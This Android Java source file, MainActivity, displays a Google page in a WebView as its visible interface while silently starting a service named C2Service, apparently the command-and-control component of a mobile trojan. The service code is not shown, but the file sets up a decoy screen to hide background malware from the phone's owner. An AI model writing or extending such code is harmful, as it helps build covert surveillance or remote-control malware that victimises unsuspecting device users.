package com.vanta.core;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.webkit.WebView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        WebView w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.loadUrl("https://www.google.com");
        setContentView(w);

        Intent i = new Intent(this, C2Service.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
    }
}
